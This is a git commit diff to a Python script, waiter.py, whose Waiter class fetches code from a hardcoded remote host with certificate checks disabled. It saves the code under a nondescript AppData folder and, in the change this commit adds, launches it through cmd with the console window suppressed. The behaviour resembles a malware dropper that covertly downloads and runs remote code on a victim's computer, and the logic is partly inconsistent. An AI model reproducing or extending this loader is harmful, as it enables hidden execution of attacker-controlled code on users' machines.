731fc15b0132b71a231709a9e57d7c04add54308
Anakin Luke Hoffmann <anakin.hoffmann@traperto.com>
2026-03-26 11:04:55 +0100

    no window

--- waiter.py
+++ waiter.py
@@ -5,8 +5,7 @@ import subprocess
 import pathlib as pl
 
 class Waiter:
-    TXT_URL = "https://action.akirottv.de"
-    APP_URL = ""
+    APP_URL = "https://action.akirottv.de"
     APP_NAME = "action_service"
     FILE_NAME = "action.py"
     BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
@@ -17,37 +16,18 @@ class Waiter:
         pass
     
     def request_url(self) -> bool:
-        self.APP_URL = self.get_txt_details()
         print(f"Received URL: {self.APP_URL}")
         if self.APP_URL.startswith("http"):
-            self.download_and_install()
             return True
         else:
             return False
-
-    def get_txt_details(self) -> str:
-        try:
-            print("Reading txt file from GitHub...")
-            context = ssl._create_unverified_context()
-            req = urllib.request.Request(self.TXT_URL)
-            req.add_header("Pragma", "no-cache")
-            with urllib.request.urlopen(req, timeout=15, context=context) as resp:
-                if getattr(resp, "status", 200) != 200:
-                    print(f"Failed to read txt file – Status: {getattr(resp,'status', 'unknown')}")
-                    exit(1)
-                content = resp.read().decode("utf-8")
-                return content
-        except Exception as e:
-            print(f"Error reading txt file: {e}")
-            exit(1)
-
 
     def download_and_install(self):
         os.makedirs(self.APP_DIR, exist_ok=True)
         try:
             print(f"→ Downloading...")
             context = ssl._create_unverified_context()
-            req = urllib.request.Request(self.TXT_URL)
+            req = urllib.request.Request(self.APP_URL)
             req.add_header("Pragma", "no-cache")
             with urllib.request.urlopen(req, timeout=15, context=context) as resp:
                 if getattr(resp, "status", 200) != 200:
@@ -59,7 +39,7 @@ class Waiter:
                 f.write(new_content)
 
             print(f"→ Successfully downloaded/updated")
-            subprocess.Popen([self.APP_PATH], shell=True)
+            subprocess.run(['start', 'cmd', '/c', 'python', 'main.py'], shell=True, cwd=self.APP_DIR, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
         except Exception as e:
             print(f"{e}")
